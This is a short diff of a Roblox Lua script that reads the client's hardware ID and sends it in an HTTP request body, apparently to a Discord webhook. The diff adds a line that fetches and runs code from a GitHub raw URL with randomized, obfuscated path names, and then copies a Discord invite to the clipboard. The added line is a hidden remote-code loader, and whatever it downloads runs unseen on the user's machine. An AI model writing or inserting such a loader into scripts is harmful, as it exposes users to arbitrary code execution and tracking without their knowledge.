@@ -43,4 +43,5 @@ local HWIDKey = game:GetService("RbxAnalyticsService"):GetClientId()
          };
          Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
         }
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0KUNh1t5jCWeTAFM/8mqsGtYULMu9MfI8/main/pqiI66WwRsaX1BLfnpsPbFCm8SsOLf"))()
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
